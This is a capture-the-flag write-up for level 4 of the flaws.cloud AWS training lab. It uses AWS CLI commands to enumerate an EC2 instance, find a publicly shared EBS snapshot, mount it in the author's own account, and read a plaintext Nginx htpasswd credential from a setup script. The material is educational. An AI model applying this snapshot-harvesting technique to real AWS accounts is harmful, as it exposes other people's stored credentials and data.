

# Flaws.cloud Level 4

Status: Done
Assign: Dcyberguy

![image.png](image%202.png)

We can see the Web application is running on an `EC2`. There is also a `snapshot` that possibly has some credentials that was used when Nginx was configured.

First I will enumerate the EC2 Instance. You don’t need the whole output, just the `ownerId` value.

```bash
aws ec2 describe-instances --region us-west-2 --profile flaws --output table
----------------------------------------------------------------------------------------
|                                   DescribeInstances                                  |
+--------------------------------------------------------------------------------------+
||                                    Reservations                                    ||
|+-----------------------------------+------------------------------------------------+|
||  OwnerId                          |  975426262029                                  ||
||  ReservationId                    |  r-0fe151dbbe77e90cc                           ||
|+-----------------------------------+------------------------------------------------+|
|||                                     Instances                                    |||
||+---------------------------+------------------------------------------------------+||
|||  AmiLaunchIndex           |  0                                                   |||
|||  Architecture             |  x86_64                                              |||
|||  ClientToken              |  kTOiC1486938563883                                  |||
|||  CurrentInstanceBootMode  |  legacy-bios                                         |||
|||  EbsOptimized             |  False                                               |||
|||  Hypervisor               |  xen                                                 |||
|||  ImageId                  |  ami-7c803d1c                                        |||
|||  InstanceId               |  i-05bef8a081f307783                                 |||
|||  InstanceType             |  t2.nano                                             |||
|||  KeyName                  |  Default                                             |||
|||  LaunchTime               |  2024-08-04T16:51:52.000Z                            |||
|||  PlatformDetails          |  Linux/UNIX                                          |||
|||  PrivateDnsName           |  ip-172-31-41-84.us-west-2.compute.internal          |||
|||  PrivateIpAddress         |  172.31.41.84                                        |||
|||  PublicDnsName            |  ec2-54-202-228-246.us-west-2.compute.amazonaws.com  |||
|||  PublicIpAddress          |  54.202.228.246                                      |||
|||  RootDeviceName           |  /dev/sda1                                           |||
|||  RootDeviceType           |  ebs                                                 |||
|||  SourceDestCheck          |  True                                                |||
|||  StateTransitionReason    |                                                      |||
|||  SubnetId                 |  subnet-d962aa90                                     |||
|||  UsageOperation           |  RunInstances                                        |||
|||  UsageOperationUpdateTime |  2017-02-12T22:29:24.000Z                            |||
|||  VirtualizationType       |  hvm                                                 |||
|||  VpcId                    |  vpc-1052ce77                                        |||
||+---------------------------+------------------------------------------------------+||
||||                               BlockDeviceMappings                              ||||
|||+-----------------------------------------+--------------------------------------+|||
||||  DeviceName                             |  /dev/sda1                           ||||
|||+-----------------------------------------+--------------------------------------+|||
|||||                                      Ebs                                     |||||
||||+----------------------------------+-------------------------------------------+||||
|||||  AttachTime                      |  2017-02-12T22:29:25.000Z                 |||||
|||||  DeleteOnTermination             |  True                                     |||||
|||||  Status                          |  attached                                 |||||
|||||  VolumeId                        |  vol-04f1c039bc13ea950                    |||||
||||+----------------------------------+-------------------------------------------+||||
||||                        CapacityReservationSpecification                        ||||
|||+----------------------------------------------------------------+---------------+|||
||||  CapacityReservationPreference                                 |  open         ||||
|||+----------------------------------------------------------------+---------------+|||
||||                                   CpuOptions                                   ||||
|||+--------------------------------------------------------------+-----------------+|||
||||  CoreCount                                                   |  1              ||||
||||  ThreadsPerCore                                              |  1              ||||
|||+--------------------------------------------------------------+-----------------+|||
||||                                 EnclaveOptions                                 ||||
|||+-------------------------------------------+------------------------------------+|||
||||  Enabled                                  |  False                             ||||
|||+-------------------------------------------+------------------------------------+|||
||||                               HibernationOptions                               ||||
|||+------------------------------------------------+-------------------------------+|||
||||  Configured                                    |  False                        ||||
|||+------------------------------------------------+-------------------------------+|||
||||                               IamInstanceProfile                               ||||
|||+--------+-----------------------------------------------------------------------+|||
||||  Arn   |  arn:aws:iam::975426262029:instance-profile/flaws                     ||||
||||  Id    |  AIPAIK7LV6U6UXJXQQR3Q                                                ||||
|||+--------+-----------------------------------------------------------------------+|||
||||                               MaintenanceOptions                               ||||
|||+-----------------------------------------------+--------------------------------+|||
||||  AutoRecovery                                 |  default                       ||||
|||+-----------------------------------------------+--------------------------------+|||
||||                                 MetadataOptions                                ||||
|||+-------------------------------------------------------+------------------------+|||
||||  HttpEndpoint                                         |  enabled               ||||
||||  HttpProtocolIpv6                                     |  disabled              ||||
||||  HttpPutResponseHopLimit                              |  1                     ||||
||||  HttpTokens                                           |  optional              ||||
||||  InstanceMetadataTags                                 |  disabled              ||||
||||  State                                                |  applied               ||||
|||+-------------------------------------------------------+------------------------+|||
||||                                   Monitoring                                   ||||
|||+---------------------------------+----------------------------------------------+|||
||||  State                          |  disabled                                    ||||
|||+---------------------------------+----------------------------------------------+|||
||||                                NetworkInterfaces                               ||||
|||+-------------------------+------------------------------------------------------+|||
||||  Description            |                                                      ||||
||||  InterfaceType          |  interface                                           ||||
||||  MacAddress             |  06:b0:7a:92:21:cf                                   ||||
||||  NetworkInterfaceId     |  eni-c26ed780                                        ||||
||||  OwnerId                |  975426262029                                        ||||
||||  PrivateDnsName         |  ip-172-31-41-84.us-west-2.compute.internal          ||||
||||  PrivateIpAddress       |  172.31.41.84                                        ||||
||||  SourceDestCheck        |  True                                                ||||
||||  Status                 |  in-use                                              ||||
||||  SubnetId               |  subnet-d962aa90                                     ||||
||||  VpcId                  |  vpc-1052ce77                                        ||||
|||+-------------------------+------------------------------------------------------+|||
|||||                                  Association                                 |||||
||||+-----------------+------------------------------------------------------------+||||
|||||  IpOwnerId      |  amazon                                                    |||||
|||||  PublicDnsName  |  ec2-54-202-228-246.us-west-2.compute.amazonaws.com        |||||
|||||  PublicIp       |  54.202.228.246                                            |||||
||||+-----------------+------------------------------------------------------------+||||
|||||                                  Attachment                                  |||||
||||+----------------------------------+-------------------------------------------+||||
|||||  AttachTime                      |  2017-02-12T22:29:24.000Z                 |||||
|||||  AttachmentId                    |  eni-attach-a4901fc2                      |||||
|||||  DeleteOnTermination             |  True                                     |||||
|||||  DeviceIndex                     |  0                                        |||||
|||||  NetworkCardIndex                |  0                                        |||||
|||||  Status                          |  attached                                 |||||
||||+----------------------------------+-------------------------------------------+||||
|||||                                    Groups                                    |||||
||||+------------------------------+-----------------------------------------------+||||
|||||  GroupId                     |  sg-490f6631                                  |||||
|||||  GroupName                   |  launch-wizard-1                              |||||
||||+------------------------------+-----------------------------------------------+||||
|||||                              PrivateIpAddresses                              |||||
||||+----------------------+-------------------------------------------------------+||||
|||||  Primary             |  True                                                 |||||
|||||  PrivateDnsName      |  ip-172-31-41-84.us-west-2.compute.internal           |||||
|||||  PrivateIpAddress    |  172.31.41.84                                         |||||
||||+----------------------+-------------------------------------------------------+||||
||||||                                 Association                                ||||||
|||||+-----------------+----------------------------------------------------------+|||||
||||||  IpOwnerId      |  amazon                                                  ||||||
||||||  PublicDnsName  |  ec2-54-202-228-246.us-west-2.compute.amazonaws.com      ||||||
||||||  PublicIp       |  54.202.228.246                                          ||||||
|||||+-----------------+----------------------------------------------------------+|||||
||||                                    Placement                                   ||||
|||+----------------------------------------------+---------------------------------+|||
||||  AvailabilityZone                            |  us-west-2a                     ||||
||||  GroupName                                   |                                 ||||
||||  Tenancy                                     |  default                        ||||
|||+----------------------------------------------+---------------------------------+|||
||||                                 SecurityGroups                                 ||||
|||+-------------------------------+------------------------------------------------+|||
||||  GroupId                      |  sg-490f6631                                   ||||
||||  GroupName                    |  launch-wizard-1                               ||||
|||+-------------------------------+------------------------------------------------+|||
||||                                      State                                     ||||
|||+---------------------------------+----------------------------------------------+|||
||||  Code                           |  16                                          ||||
||||  Name                           |  running                                     ||||
|||+---------------------------------+----------------------------------------------+|||

```

I will use the ownersId gotten from the previous commands to get any `snapshot` in that particular region.

```bash
aws ec2 describe-snapshots --region us-west-2 --owner-ids 975426262029 --profile flaws
{
    "Snapshots": [
        {
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "VolumeId": "vol-04f1c039bc13ea950",
            "State": "completed",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "Progress": "100%",
            "OwnerId": "975426262029",
            "Description": "",
            "VolumeSize": 8,
            "Encrypted": false
        }
    ]
}

```

Looking at the snapshot permissions, I found out it is open to the `public`. So it does matter what AWS account, this snapshot can be imported there. 

```bash
aws ec2 describe-snapshot-attribute \
> --region us-west-2 \
> --snapshot-id snap-0b49342abd1bdcb89 \
> --attribute createVolumePermission \
> --profile flaws | jq
{
  "SnapshotId": "snap-0b49342abd1bdcb89",
  "CreateVolumePermissions": [
    {
      "Group": "all"
    }
  ]
}

```

The way we can do this, is by creating a `Virtual machine` in our AWS account and attaching the above AWS managed snapshot.

![image.png](image%203.png)

Attached the EBS snapshot

![image.png](image%204.png)

Login to the EC2 Instance

```bash
ssh -i "Flaws-level4.pem" ec2-user@ec2-35-162-115-207.us-west-2.compute.amazonaws.com 
The authenticity of host 'ec2-35-162-115-207.us-west-2.compute.amazonaws.com (35.162.115.207)' can't be established.
ED25519 key fingerprint is SHA256:pGZJSSWlZH+cmFv7sWnLUggACHf4rq5X2IlP69E2WhM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ec2-35-162-115-207.us-west-2.compute.amazonaws.com' (ED25519) to the list of known hosts.
   ,     #_
   ~\_  ####_        Amazon Linux 2023
  ~~  \_#####\
  ~~     \###|
  ~~       \#/ ___   https://aws.amazon.com/linux/amazon-linux-2023
   ~~       V~' '->
    ~~~         /
      ~~._.   _/
         _/ _/
       _/m/'
[ec2-user@ip-172-31-33-122 ~]$ df -h
Filesystem        Size  Used Avail Use% Mounted on
devtmpfs          4.0M     0  4.0M   0% /dev
tmpfs             459M     0  459M   0% /dev/shm
tmpfs             184M  448K  183M   1% /run
/dev/nvme0n1p1    8.0G  1.6G  6.5G  19% /
tmpfs             459M     0  459M   0% /tmp
/dev/nvme0n1p128   10M  1.3M  8.7M  13% /boot/efi
tmpfs              92M     0   92M   0% /run/user/1000
[ec2-user@ip-172-31-33-122 ~]$ ls /mnt/
[ec2-user@ip-172-31-33-122 ~]$ ls
[ec2-user@ip-172-31-33-122 ~]$ ls /media/
[ec2-user@ip-172-31-33-122 ~]$ ls /
bin  boot  dev  etc  home  lib  lib64  local  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
[ec2-user@ip-172-31-33-122 ~]$ lsblk
NAME          MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS
nvme0n1       259:0    0   8G  0 disk 
├─nvme0n1p1   259:3    0   8G  0 part /
├─nvme0n1p127 259:4    0   1M  0 part 
└─nvme0n1p128 259:5    0  10M  0 part /boot/efi
nvme1n1       259:1    0   8G  0 disk 
└─nvme1n1p1   259:2    0   8G  0 part 

```

Mount the `nvme1n1p1` to the `/mnt` folder

```bash
[ec2-user@ip-172-31-23-127 ~]$ sudo mount /dev/nvme1n1p1 /mnt
[ec2-user@ip-172-31-23-127 ~]$ cd /mnt/
[ec2-user@ip-172-31-23-127 mnt]$ ls /mnt/home/
ubuntu
[ec2-user@ip-172-31-23-127 mnt]$ ls /mnt/home/ubuntu/
meta-data  setupNginx.sh
[ec2-user@ip-172-31-23-127 mnt]$ ls -l /mnt/home/ubuntu/
total 8
-rw-rw-r--. 1 ec2-user ec2-user 268 Feb 12  2017 meta-data
-rw-r--r--. 1 ec2-user ec2-user  72 Feb 13  2017 setupNginx.sh
[ec2-user@ip-172-31-23-127 mnt]$ cat /mnt/home/ubuntu/meta-data 
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/[ec2-user@ip-172-31-23-127 mnt]$ cat /mnt/home/ubuntu/setupNginx.sh 
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M

```

Nice I found creds: Username: `flaws` and Password: `nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`

![image.png](image%205.png)

![image.png](image%206.png)

[](http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/)